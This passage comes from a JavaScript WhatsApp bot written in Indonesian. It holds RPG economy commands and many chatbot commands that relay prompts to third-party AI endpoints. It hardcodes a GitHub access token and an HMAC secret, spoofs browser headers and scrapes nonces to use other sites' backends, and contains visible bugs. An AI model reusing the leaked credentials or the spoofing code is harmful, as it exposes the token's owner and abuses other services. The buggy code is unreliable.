  reply(`🔬 Skill *${skill}* meningkat!`)
  break
}
case 'invasion': {
  reply(`⚔️ Kamu memulai invasi ke wilayah musuh! Gunakan *duel* untuk menyerang target.`)
  break
}
case 'finaltrial': {
  initRpgUser(sender, pushname)
  if (rpgDb[sender].level < 99) return reply('🚫 Butuh level 99 untuk ikut ujian akhir.')
  reply(`🔥 Ujian Dimulai!\nLawan 3 boss secara beruntun...`)
  break
}
case 'shop': {
  initRpgUser(sender, pushname)
  let teks = `🛒 *TOKO RPG UTAMA*

📦 *Kategori Tersedia:*
1. *Weapon* ⚔️
2. *Armor* 🛡️
3. *Potion* 🧪
4. *Material* 🧱
5. *Key Item* 🔑
6. *Mystic* ✨
7. *Pet & Mount* 🐾

Ketik: *shop [kategori]* contoh: shop weapon

📝 *Contoh barang (weapon)*:
• Pedang Kayu — 500 coin
• Belati Baja — 1000 coin
• Busur Elven — 1200 coin
(Stok berubah setiap hari!)
`
  return reply(teks)
}
case 'buy': {
  initRpgUser(sender, pushname)
  if (!text) return reply('Masukkan nama item yang ingin dibeli.')

  let item = text.toLowerCase()
  let harga = {
    scrollclass: 500,
    stonebless: 350,
    essencexp: 400,
    spiritcore: 1000,
    elixirlife: 750,
  }

  if (!harga[item]) return reply('Item tidak ditemukan di toko.')

  if (rpgDb[sender].coin < harga[item]) return reply('💰 Uang kamu tidak cukup.')

  rpgDb[sender].coin -= harga[item]

  switch (item) {
    case 'scrollclass':
      rpgDb[sender].class = null
      break
    case 'stonebless':
      rpgDb[sender].buff = 'atk+10%'
      break
    case 'essencexp':
      rpgDb[sender].exp += 500
      break
    case 'spiritcore':
      rpgDb[sender].spirit = 'phoenix'
      break
    case 'elixirlife':
      rpgDb[sender].death = false
      break
  }

  saveRpg()
  reply(`✅ Kamu membeli *${item}* seharga ${harga[item]} coin.`)
  break
}
case 'sell': {
  initRpgUser(sender, pushname)
  if (!text) {
    reply(`Ketik nama item yang ingin dijual. Contoh: *sell ramuan*`)
    break
  }

  let user = rpgDb[sender]
  let idx = user.inv.findIndex(i => i.toLowerCase() === text.toLowerCase())
  if (idx === -1) {
    reply(`Kamu tidak punya item *${text}* untuk dijual.`)
    break
  }

  let harga = 100 // bisa kamu buat lebih dinamis nanti
  user.inv.splice(idx, 1)
  user.coin += harga
  saveRpg()

  reply(`💸 Kamu menjual *${text}*\n+💰 ${harga} koin`)
  break
}

case 'daily': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let now = Date.now()
  let cooldown = 1000 * 60 * 60 * 24
  let remaining = cooldown - (now - user.dailyCooldown)

  if (remaining > 0) {
    reply(`🕒 Kamu sudah klaim hari ini!\nTunggu *${msToTime(remaining)}* lagi.`)
    break
  }

  let reward = { coin: 300, exp: 120 }
  user.coin += reward.coin
  user.exp += reward.exp
  user.dailyCooldown = now
  saveRpg()

  reply(`🎁 *Daily Reward*\n+💰 ${reward.coin} koin\n+⭐ ${reward.exp} exp`)
  break
}
case 'work': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let now = Date.now()
  let cooldown = 1000 * 60 * 30
  let remaining = cooldown - (now - user.workCooldown)

  if (remaining > 0) {
    reply(`🕒 Masih lelah...\nTunggu *${msToTime(remaining)}* lagi.`)
    break
  }

  let earned = Math.floor(Math.random() * 200 + 100)
  user.coin += earned
  user.workCooldown = now
  saveRpg()

  reply(`💼 Kamu bekerja dan mendapat\n+💰 ${earned} koin`)
  break
}
case 'hunt': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let now = Date.now()
  let cooldown = 1000 * 60 * 60
  let remaining = cooldown - (now - user.huntCooldown)

  if (remaining > 0) {
    reply(`🕒 Kamu butuh istirahat.\nTunggu *${msToTime(remaining)}* lagi.`)
    break
  }

  let drops = ['daging', 'kulit', 'tulang']
  let drop = drops[Math.floor(Math.random() * drops.length)]
  user.inv.push(drop)
  user.exp += 50
  user.huntCooldown = now
  saveRpg()

  reply(`🏹 Kamu berburu dan mendapat:\n+🎒 ${drop}\n+⭐ 50 exp`)
  break
}
case 'inv': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (!user.inventory || user.inventory.length === 0) return reply('🎒 Tas kamu kosong.')

  let teks = `🎒 *INVENTORY*

${user.inventory.map((item, i) => `• ${item.nama} x${item.jumlah}`).join('\n')}

Gunakan: *equip [item]* untuk memasang
Gunakan: *sell [item]* untuk menjual
`
  return reply(teks)
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Rpg Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// AI Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'quantum-ai': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh:\n${XyrooRynzz} what is artificial intelligence?`)

  try {
    const api = `https://zelapioffciall.vercel.app/ai/quantum?text=${encodeURIComponent(text)}`
    const res = await fetch(api)
    if (!res.ok) throw await res.text()
    
    const json = await res.json()
    if (!json.result) return reply('❌ Gagal mendapatkan respon dari AI.')

    reply(json.result)
  } catch (e) {
    console.error('[QUANTUM AI ERROR]', e)
    reply('❌ Terjadi kesalahan saat mengambil respon dari Quantum AI.')
  }
}
break
case 'chatai': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!args.length) return reply('Masukkan Pertanyaan')
    let payload = { messages: [{ role: 'user', content: args.join(' ') }] }
    let headers = { headers: { Origin: 'https://chatai.org', Referer: 'https://chatai.org/' } }
    let { data } = await axios.post('https://chatai.org/api/chat', payload, headers)
    
    reply(data?.content || 'Tidak ada jawaban')
  } catch (e) {
    reply(e.message)
  }
}
break;
case 'conciseai': {
if (isBan) return XRB()
await XReaction()
  const chatAI = async text => {
    let user_id = uuidv4().replace(/-/g, '')
    let lastMsg = `USER: ${text}`
    let signature = crypto.createHmac('sha256', 'CONSICESIGAIMOVIESkjkjs32120djwejk2372kjsajs3u293829323dkjd8238293938wweiuwe')
      .update(user_id + lastMsg + 'normal')
      .digest('hex')
 
    let form = new URLSearchParams({
      question: lastMsg,
      conciseaiUserId: user_id,
      signature,
      previousChats: JSON.stringify([{ a: '', b: lastMsg, c: false }]),
      model: 'normal'
    })
 
    let { data } = await axios.post('https://toki-41b08d0904ce.herokuapp.com/api/conciseai/chat', form.toString(), {
      headers: {
        'User-Agent': 'okhttp/4.10.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    return data.answer
  }
 
  try {
    if (!args.length) throw 'Masukkan Pertanyaan'
    reply(await chatAI(args.join(' ')))
  } catch (e) {
    reply(e.message || e)
  }
}
break;
case 'claudeai': {
if (isBan) return XRB()
await XReaction()
  if (!text) {
    return reply(`Masukkan Pertanyaan?`)
  }
 
  try {
    const headers = {
      'Accept': '*/*',
      'Referer': 'https://claudeai.one/',
      'Origin': 'https://claudeai.one',
      'User-Agent': 'Mozilla/5.0'
    }
 
    const res = await fetch('https://claudeai.one/', { headers })
    const html = await res.text()
 
    const dom = new JSDOM(html)
    const doc = dom.window.document
 
    const nonce = doc.querySelector('[data-nonce]')?.getAttribute('data-nonce') || ''
    const postId = doc.querySelector('[data-post-id]')?.getAttribute('data-post-id') || ''
    const botId = doc.querySelector('[data-bot-id]')?.getAttribute('data-bot-id') || ''
 
    const clientId = html.match(/localStorage\.setItem['"]wpaicg_chat_client_id['"],\s*['"](.+?)['"]/)?.[1] || 
      'JHFiony-' + Math.random().toString(36).substring(2, 12)
 
    const form = new FormData()
    form.append('_wpnonce', nonce)
    form.append('post_id', postId)
    form.append('url', 'https://claudeai.one')
    form.append('action', 'wpaicg_chat_shortcode_message')
    form.append('message', text)
    form.append('bot_id', botId)
    form.append('chatbot_identity', 'shortcode')
    form.append('wpaicg_chat_history', '[]')
    form.append('wpaicg_chat_client_id', clientId)
 
    const resPost = await fetch('https://claudeai.one/wp-admin/admin-ajax.php', {
      method: 'POST',
      headers: {
        ...headers,
        ...form.getHeaders()
      },
      body: form
    })
 
    const json = await resPost.json()
    const jawaban = json?.data
 
    if (!jawaban) return reply('[!] Gagal mendapatkan balasan dari Claude.')
 
    await reply(jawaban)
 
  } catch (e) {
    await reply('Terjadi error:\n' + JSON.stringify(e.message || e, null, 2))
  }
 
  break
}
case 'chatgpt': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Masukkan Pertanyaan?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
const axios = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'Tidak ada jawaban.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nGagal mengambil jawaban.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        reply(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        reply('Terjadi kesalahan saat mengambil jawaban.');
    }
}
break
case 'venice': case 'veniceai': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Masukkan Pertanyaan`);
try {
const axios = require('axios');
const { data } = await axios.request({
method: 'POST',
url: 'https://outerface.venice.ai/api/inference/chat',
headers: {
accept: '*/*',
'content-type': 'application/json',
origin: 'https://venice.ai',
referer: 'https://venice.ai/',
'user-agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
'x-venice-version': 'interface@20250523.214528+393d253'
},
data: JSON.stringify({
requestId: 'nekorinn',
modelId: 'dolphin-3.0-mistral-24b',
prompt: [
{
content: text,
role: 'user'
}
],
systemPrompt: '',
conversationType: 'text',
temperature: 0.8,
webEnabled: true,
topP: 0.9,
isCharacter: false,
clientProcessingTime: 15
})
});
const chunks = data.split('\n').filter(v => v).map(v => JSON.parse(v));
const hasil = chunks.map(v => v.content).join('');
Alice.sendMessage(m.chat, { text: hasil }, { quoted: m });
} catch (e) {
console.error(e.message);
Alice.sendMessage(m.chat, { text: 'Maaf, tidak ada hasil dari Venice.' }, { quoted: m });
}
}
break
case 'logic-eai': {
if (isBan) return XRB()
await XReaction()
    if (!q) {
        return reply(`Mauu Tanyaa Apa`);
    }

    const customName = "logic-eai"; 
    const creator = "XyrooRynzz";
    const systemMessage = `Nama kamu sekarang adalah ${customName} dan kamu diciptakan oleh ${creator}`;

    const url = "https://velyn.biz.id/api/ai/aicustom";

    try {
        const response = await axios.get(url, {
            params: {
                prompt: q,
                system: systemMessage
            }
        });

        if (response.data && response.data.data) {
            Alice.sendMessage(m.chat, { text: response.data.data }, { quoted: m });
        } else {
            throw new Error("Tidak ada respon dari API.");
        }
    } catch (error) {
        console.error("Error AI:", error);
        reply("Maaf, terjadi kesalahan saat menghubungi AI.");
    }
};
break
case 'gpt41-mini': {
if (isBan) return XRB()
await XReaction()  
const OpenAIPrompt = ``;

const OpenAI = require("openai"); 
const token = "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"; 
const endpoint = "https://models.github.ai/inference";
const model = "openai/gpt-4.1-mini";

async function openai(userPrompt) {
    const client = new OpenAI({
        baseURL: endpoint,
        apiKey: token,
    });

    const response = await Alice.chat.completions.create({
        messages: [
            { role: "system", content: OpenAIPrompt.trim() }, 
            { role: "user", content: userPrompt }
        ],
        temperature: 1,
        top_p: 1,
        model: model
    });

    return response.choices[0].message.content.replace(/\*\*(.*?)\*\*/g, '*$1*');
}

    if (!text) {
        return reply(`Example: ${XyrooRynzz} Siapa Jokowi`);
    }

    

    try {
        const hasil = await openai(text);
        reply(hasil);
    } catch (e) {
        console.error(e);
        reply('❌ Maaf, Tsukasa-chan sedang kelelahan... coba lagi nanti ya.');
    }
};
break
case 'openai': {
if (isBan) return XRB()
await XReaction()  
const OpenAIPrompt = `
hallo ${pushname} Ayo perkenalkan dirimu, saya adalah ${botname} dan Model saya Adalah OpenAI GPT - 4.1 ini, sekaligus saya bukan dep ke orang-orang. Maaf puh
`;

const OpenAI = require("openai"); 
const token = "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"; 
const endpoint = "https://models.github.ai/inference";
const model = "openai/gpt-4.1";


async function openai(userPrompt) {
    const client = new OpenAI({
        baseURL: endpoint,
        apiKey: token,
    });

    const response = await Alice.chat.completions.create({
        messages: [
            { role: "system", content: OpenAIPrompt.trim() }, 
            { role: "user", content: userPrompt }
        ],
        temperature: 1,
        top_p: 1,
        model: model
    });

    return response.choices[0].message.content.replace(/\*\*(.*?)\*\*/g, '*$1*');
}

    if (!text) {
        return reply(`Example: ${XyrooRynzz} Siapa Penemu Sepak Bola`);
    }

    

    try {
        const hasil = await openai(text);
        reply(hasil);
    } catch (e) {
        console.error(e);
        reply('❌ Maaf, Tsukasa-chan sedang kelelahan... coba lagi nanti ya.');
    }
};
break
case 'metaai': {
if (isBan) return XRB()
await XReaction()  
const MetaAi = {
  chat: async (question) => {
    let d = new FormData();
    d.append("content", `User: ${question}`);
    d.append("model", "@groq/llama-3.1-8b-instant");

    let head = {
      headers: {
        ...d.getHeaders(),
      },
    };

    try {
      let { data } = await axios.post("https://mind.hydrooo.web.id/v1/chat", d, head);
      return data.result || data.full_result || JSON.stringify(data);
    } catch (error) {
      console.error("API Error:", error.response?.data || error.message);
      throw new Error("Gagal mengambil jawaban dari AI.");
    }
  }
};


  if (!text) return reply(`Example: ${XyrooRynzz} Siapa Penemu Sepak Bola`);

  try {

    const result = await MetaAi.chat(text);

    await Alice.sendMessage(m.chat, {
      text: result
    }, { quoted: m });
  } catch (error) {
    console.error("Error:", error);
    await reply("Error :v");
  }
};
break
case 'deepseek': {
if (isBan) return XRB()
await XReaction()  

const deepSeekThink = {
  chat: async (question) => {
    let d = new FormData();
    d.append("content", `User: ${question}`);
    d.append("model", "@hf/thebloke/deepseek-coder-6.7b-instruct-awq");

    let head = {
      headers: {
        ...d.getHeaders(),
      },
    };

    try {
      let { data } = await axios.post("https://mind.hydrooo.web.id/v1/chat", d, head);
      return data.result || data.full_result || JSON.stringify(data);
    } catch (error) {
      console.error("API Error:", error.response?.data || error.message);
      throw new Error("Gagal mengambil jawaban dari AI.");
    }
  }
};

  if (!text) return reply(`Example: ${XyrooRynzz} Siapa Jokowi`);

  try {

    const result = await deepSeekThink.chat(text);

    await Alice.sendMessage(m.chat, {
      text: result
    }, { quoted: m });
  } catch (error) {
    console.error("Error:", error);
    await reply("Error :v");
  }
};
break
case 'gptlogic': {
if (isBan) return XRB()
await XReaction()  
    if (!text) return reply(`Example: ${XyrooRynzz} Siapa Jokowi`);

    try {
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": {
                "id": "gpt-3.5-turbo-0613",
                "name": "GPT-3.5",
                "maxLength": 12000,
                "tokenLimit": 4000,
                "completionTokenLimit": 2500,
                "deploymentName": "gpt-35"
            },
            "messages": [
                {
                    "pluginId": null,
                    "content": text,
                    "role": "user"
                }
            ],
            "prompt": "Kamu adalah AI yang membantu pengguna dalam menjawab pertanyaan dengan akurat.",
            "temperature": 0.5
        }, {
            headers: {
                "Accept": "/*/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            }
        });

        let result = response.data;
        Alice.sendMessage(m.chat, { text: result }, { quoted: m });
    } catch (error) {
        console.error("Error fetching data:", error);
        Alice.sendMessage(m.chat, { text: "Terjadi kesalahan saat memproses permintaan." }, { quoted: m });
    }
};
break
case 'aoyoai': {
if (isBan) return XRB()
await XReaction()  
  if (!text) return reply('Masukkan pertanyaan?');

  try {
    let { data } = await axios.get(`https://www.abella.icu/aoyoai?q=${encodeURIComponent(text)}`);
    if (data?.status !== 'success') throw 'Gagal mendapatkan respons dari Web';
    
    let res = data?.data?.response;
    if (!res) throw 'Respons tidak ditemukan';
    
    reply(res);
  } catch (e) {
    reply('Yah Error');
  }
};
break
case 'chatbotai': {
if (isBan) return XRB()
await XReaction()  
  if (!text) return reply('Masukkan pertanyaan?');
  try {
    let { data } = await axios.get(`https://www.abella.icu/onlinechatbot?q=${encodeURIComponent(text)}`);
    if (data?.data?.answer?.data) {
      reply(data.data.answer.data);
    } else {
      reply('Tidak dapat menemukan jawaban dari AI.');
    }
  } catch (e) {
    reply('Terjadi kesalahan saat mengambil jawaban.');
  }
};
break
case 'blackbox-pro': {
if (isBan) return XRB()
await XReaction()  
  if (!text) return reply('Masukkan pertanyaan?');
  try {
    let { data } = await axios.get('https://www.abella.icu/blackbox-pro?q=' + encodeURIComponent(text));
    if (data?.status !== 'success') return reply('Gagal mengambil jawaban.');
    reply(data.data.answer.result);
  } catch {
    reply('Error');
  }
};
break
case 'zerogpt':
if (isBan) return XRB()
await XReaction()  
  if (!q) return reply('Masukkan pertanyaan?');
  try {
    const axios = require('axios');
    const id = () => Math.random().toString(36).slice(2, 18);
    const res = await axios.post('https://zerogptai.org/wp-json/mwai-ui/v1/chats/submit', {
      botId: "default",
      customId: null,
      session: "N/A",
      chatId: id(),
      contextId: 39,
      messages: [],
      newMessage: q,
      newFileId: null,
      stream: true
    }, {
      headers: {
        'Content-Type': 'application/json',
        'X-WP-Nonce': 'e7b64e1953',
        'Accept': 'text/event-stream'
      },
      responseType: 'stream'
    });
    let out = '';
    res.data.on('data', chunk => {
      chunk.toString().split('\n').forEach(line => {
        if (line.startsWith('data: ')) {
          const data = JSON.parse(line.slice(6));
          if (data.type === 'live') out += data.data;
          if (data.type === 'end') reply(out.trim());
        }
      });
    });
  } catch (e) {
    reply('Error: ' + e.message);
  }
  break
case 'writecream': {
if (isBan) return XRB()
await XReaction()
 if (!text) return reply(`Masukkan pertanyaan\nExample : ${XyrooRynzz} kamu psikolog|aku sering gelisah malam hari, kenapa ya?`);

 const [logic, question] = text.split('|').map(v => v.trim());
 if (!logic || !question) return reply(`Format salah\nExample : ${XyrooRynzz} persona|pertanyaan`);
 
 async function writecream(logic, question) {
 const url = "https://8pe3nv3qha.execute-api.us-east-1.amazonaws.com/default/llm_chat";
 const query = [
 { role: "system", content: logic },
 { role: "user", content: question }
 ];
 const params = new URLSearchParams({
 query: JSON.stringify(query),
 link: "writecream.com"
 });

 try {
 const response = await fetch(`${url}?${params.toString()}`);
 const data = await response.json();

 let raw = data.response_content || data.reply || data.result || data.text || '';
 let cleaned = raw
 .replace(/\\n/g, '\n')
 .replace(/\n{2,}/g, '\n\n')
 .replace(/\*\*(.*?)\*\*/g, '*$1*');

 return cleaned.trim();
 } catch (error) {
 return `Gagal mengambil respons: ${error.message}`;
 }
}

 const response = await writecream(logic, question);
 reply(response || 'Tidak ada respons.');
};
break
case 'yupraai': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply('Masukkan pertanyaan?');

 const timestamp = Date.now();
 const sessionId = m.chat;
 const encodedText = encodeURIComponent(text);
 const url = `https://api.yupradev.biz.id/ai/ypai?text=${encodedText}&t=${timestamp}&session=${sessionId}`;

 try {
 const res = await axios.get(url, {
 headers: {
 authority: 'api.yupradev.biz.id',
 accept: '*/*',
 origin: 'https://ai.yupradev.biz.id',
 referer: 'https://ai.yupradev.biz.id/',
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
 }
 });

 const data = res.data;
 const replyText = data.response || data.result || JSON.stringify(data);
 await reply(replyText.trim(), m);
 } catch (err) {
 console.error(err);
 await reply('❌ Gagal ke API: ${err.message}');
 }
};
break
case 'feloai': {
if (isBan) return XRB()
await XReaction()
  if (!q) return reply('Masukkan pertanyaan?');
  try {

    const licefelo = await Felo(q);
    if (licefelo.error) {
      reply("*Terjadi Kesalahan*");
      return;
    }

    let answer = licefelo.answer || "Tidak ada jawaban yang ditemukan.";
    let sources = licefelo.source.length > 0
      ? `*Sumber Yang Saya Gunakan*:\n${licefelo.source
          .filter(src => src.link)
          .slice(0, 5)
          .map((src, i) => `_${src.link}_`)
          .join("\n\n")}`
      : "-";

    let messg = `ᴘᴏᴡᴇʀᴇᴅ ᴡɪᴛʜ ғᴇʟᴏᴀɪ\n\n${answer}\n\n${sources}`;

    await Alice.sendMessage(m.chat, { text: messg });
  } catch (error) {
    console.error(error);
    reply("⚠ *Terjadi Kesalahan*");
  }
}
break

case 'aliceai' : {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Tulis sesuatu setelah perintah ini.\n\nContoh:\n${XyrooRynzz} hai apa kabar?\n${XyrooRynzz} https://vt.tiktok.com/ZSFxYcCdr/\n${XyrooRynzz} buatkan gambar wanita`)

    let regexTikTok = /(https?:\/\/)?(www\.|vm\.|vt\.)?tiktok\.com\/[^\s]+/gi
    let isTikTok = regexTikTok.test(text)
    let isImageReq = /(gambar|buatkan.*gambar|bikin.*gambar|buat.*gambar)/i.test(text)

    if (isTikTok) {
      let link = text.match(regexTikTok)[0]
      let res = await fetch(`https://www.velyn.biz.id/api/downloader/tiktok?url=${encodeURIComponent(link)}`)
      let json = await res.json()

      if (!json?.status || !json?.data?.no_watermark) {
        return reply(`❌ Error\nLogs error : Gagal mengunduh video TikTok.`)
      }

      let prompt = `Buatkan caption menarik untuk video TikTok dengan judul: ${json?.data?.title || 'tanpa judul'}`
      let aiRes = await fetch(`https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(prompt)}`)
      let aiJson = await aiRes.json()

      if (!aiJson?.status || !aiJson?.result) {
        return reply(`❌ Error\nLogs error : Gagal mendapatkan caption dari AI.`)
      }

      await Alice.sendMessage(m.chat, {
        video: { url: json.data.no_watermark },
        caption: aiJson.result.toString()
      }, { quoted: m })

    } else if (isImageReq) {
      let prompt = text
      let res = await fetch(`https://www.velyn.biz.id/api/ai/text2img?prompt=${encodeURIComponent(prompt)}`)
      if (!res.ok) return reply(`❌ Error\nLogs error : Gagal menghubungi layanan gambar.`)

      let buffer = await res.buffer()
      await Alice.sendMessage(m.chat, {
        image: buffer,
        caption: `Berikut hasil gambar untuk prompt:\n*${prompt}*`
      }, { quoted: m })

    } else {
      let prompt = text
      let res = await fetch(`https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(prompt)}`)
      let json = await res.json()

      if (!json?.status || !json?.result) {
        throw `❌ Error\nLogs error : Gagal merespons pesan AI.`
      }

      reply(json.result.toString())
    }

  } catch (e) {
    console.error(e)
    return reply(`❌ Error\nLogs error : ${(e?.message || e).toString()}`)
  }
}
break

case 'magicstudio': {
if (isBan) return XRB()
await XReaction()
    if (!args[0]) return reply(`Masukkan prompt untuk gambar!\nExample: ${XyrooRynzz} buatkan gambar wanita sedang memegang botol cocacola sambil menyender di tembok`);
 
    let prompt = encodeURIComponent(args.join(' '));
    let apiUrl = `https://velyn.biz.id/api/ai/magicStudio?prompt=${prompt}&apikey=velyn`;
 
    try {
        let res = await fetch(apiUrl);
        let contentType = res.headers.get('content-type');
 
        console.log('Content-Type:', contentType); 
 
        if (contentType && contentType.startsWith('image')) {
            let buffer = await res.buffer();
            await Alice.sendFile(m.chat, buffer, 'magicStudio.jpg', `Berhasil Membuat Gambar\n${packname}`, xy);
        } else {
            reply('Gagal mendapatkan gambar, API mungkin sedang error.');
        }
    } catch (e) {
        console.error('Fetch Error:', e);
        reply('Terjadi kesalahan saat menghubungi API.');
    }
};
break

case 'gemmaai' : {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply('Masukkan pertanyaan?');

  try {
    const res = await fetch(`https://www.velyn.biz.id/api/ai/gemma-2-9b-it?prompt=${encodeURIComponent(text)}`)
    if (res.ok) {
      const json = await res.json()
      if (json.status) {
        await Alice.sendMessage(m.chat, { text: json.data }, { quoted: m })
      } else {
        await Alice.sendMessage(m.chat, { text: 'Gagal mendapatkan data dari API.' }, { quoted: m })
      }
    } else {
      await Alice.sendMessage(m.chat, { text: `Status error: ${res.status}` }, { quoted: m })
    }
  } catch (e) {
    await Alice.sendMessage(m.chat, { text: 'Terjadi kesalahan internal saat memproses permintaan.' }, { quoted: m })
    console.error(e)
  }
}
break
case 'aivelyn':
case 'velynai': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply('Masukkan pertanyaan?');

  try {
    const url = `https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(text)}`;
    const response = await fetch(url);

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const data = await response.json();
    const result = data.result || "Maaf, tidak ada jawaban.";

    return reply(result);
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    return reply("Maaf, terjadi kesalahan saat menghubungi AI.");
  }
}
break

case 'muslimai': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply('Masukkan pertanyaan?');

  try {
    const result = await muslimai(text);

    if (result.error) return reply(result.error);

    let sourcesText = result.sources.length > 0 
        ? result.sources.map((src, index) => `${index + 1}. *${src.title}*\n🔗 ${src.url}`).join("\n\n")
        : "Tidak ada sumber yang ditemukan.";

    let responseMessage = `ᴘᴏᴡᴇʀᴇᴅ ᴡɪᴛʜ ᴍᴜsʟɪᴍᴀɪ\n\n${result.answer}`;

    reply(responseMessage);
} catch (error) {
    console.error("⚠ *Error* :", error);
    reply("Terjadi kesalahan.");
}
}
break;

case 'llama-ai':{
if (isBan) return XRB()
await XReaction()
let messages = [];
  try {
 
    if (!text) return reply('Masukkan pertanyaan?');
    let response = await fetch(`https://restapii.rioooxdzz.web.id/api/llama?message=${encodeURIComponent(text)}`);
 
    if (!response.ok) {
      throw new Error("Request to OpenAI API failed");
    }
 
    let result = await response.json();
 
    await Alice.sendMessage(m.chat, {
      text: "" + result.data.response,
    });
 
    messages = [...messages, { role: "user", content: text }];
  } catch (error) {
    await Alice.sendMessage(m.chat, {
      text: "" + `Error: ${error.message}`,
    });
  }
}
break

case 'gptturbo':{
if (isBan) return XRB()
await XReaction()
async function gptturbo(query) {
    const apiUrl = `https://restapii.rioooxdzz.web.id/api/gptturbo?message=${encodeURIComponent(query)}`;
 
    try {
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            }
        });
        if (!response.ok) {
            throw new Error(`Error: ${response.status}`);
        }
 
        const responseJson = await response.json();
         if (responseJson && responseJson.data.response) {
            return responseJson.data.response;
        } else {
            return "Tidak ada pesan dalam response.";
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
        return "Gagal mendapatkan respons dari server.";
    }
}
 
if (!text) return reply(`Contoh:\n${Xyroo}${command} Halo?`);
let gpiti = await gptturbo(text);
let turbo = `Title : ${text}\n\nMessage : ${gpiti}\n`;
await Alice.sendMessage(m.chat, {
    text: "⬣───「 *G P T T U R B O* 」───⬣" + "\n\n" + turbo,
    contextInfo: {
      externalAdreply: {  
        title: "GPT - TURBO",
        body: '',
        thumbnailUrl: "https://pomf2.lain.la/f/jzv6iqu.jpg",
        sourceUrl: null,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m });
}
break

case 'gemini-ai': {
if (isBan) return XRB()
await XReaction()  
    const isQuotedImage = m.quoted && m.quoted.mtype === 'imageMessage';
    const isImage = m.mtype === 'imageMessage';
    const quoted = m.quoted ? m.quoted : m;

    if (isImage || isQuotedImage) {
        try {

            const mediaPath = await Alice.downloadAndSaveMediaMessage(quoted);
            const media = fs.readFileSync(mediaPath);

            const uploadedImageUrl = await uploadImage(media);
            console.log('Gambar berhasil diupload:', uploadedImageUrl);

            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/image`;
            const params = {
                q: 'What is this picture? Please describe it.',
                url: uploadedImageUrl
            };

            const response = await axios.get(apiUrl, { params });
            const description = response.data?.content || 'Gagal mendapatkan deskripsi gambar.';

            await Alice.sendMessage(m.chat, {
                text: `📷 *Deskripsi Gambar:*\n${description}`
            }, { quoted: m });

            fs.unlinkSync(mediaPath);
        } catch (error) {
            console.error('Error deskripsi gambar:', error);
            await Alice.sendMessage(m.chat, {
                text: '❌ Terjadi kesalahan saat memproses gambar.'
            }, { quoted: m });
        }
    } else {
        try {
            if (!text) return reply(`Example: ${XyrooRynzz} Siapa Jokowi`);

            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/chat`;
            const params = { q: text };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';

            await Alice.sendMessage(m.chat, {
                text: `🤖 *AI Gemini:*\n${replyText}`
            }, { quoted: m });
        } catch (error) {
            console.error('Error Gemini Chat:', error);
            await Alice.sendMessage(m.chat, {
                text: '❌ Terjadi kesalahan saat memproses permintaan AI.'
            }, { quoted: m });
        }
    }
};
break

case 'lumin-ai': {
if (isBan) return XRB()
await XReaction()
  if (!q) return reply(`Ada yang bisa aku bantu?`);
  
  try {
      const aliceeai = await Eai(q);
      if (!aliceeai) {
          return reply("Tidak Ada Respon");
      }
      await reply(`${aliceeai}\n\n${packname}`);
  } catch (error) {
      console.error("Error Saat Mendapatkan Data :", error.message);
